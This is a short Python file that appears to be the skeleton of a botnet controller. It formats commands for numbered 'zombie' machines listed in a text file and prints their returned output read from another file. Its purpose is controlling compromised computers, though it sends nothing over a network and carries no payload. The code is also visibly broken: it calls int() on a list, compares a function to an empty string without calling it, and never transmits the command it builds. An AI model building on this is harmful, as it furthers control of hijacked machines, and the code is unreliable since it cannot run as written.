import json

def send_command(zombie, command):
  allzombies = int(open('zombies.txt').read().split('\n'))
  if (int(zombie) <= len(allzombies)):
    command = command.replace('"','998721$')
    commandtosend = '{"command":"'+command+'","zombie":"'+str(zombie)+'"}'
    print('Command to zombie sent')
    print('Setting update status to 2S')
  else:
    print('Zombie is not connected')
  
def get_output():
  out = open('output.txt','r').read()
  return out


def zombiecontroller():
  if (get_output != ''):
   outs = json.loads(get_output())
   print('Zombie '+outs["zombieid"]+' has news')
   print(outs["output"].replace('998721$','"'))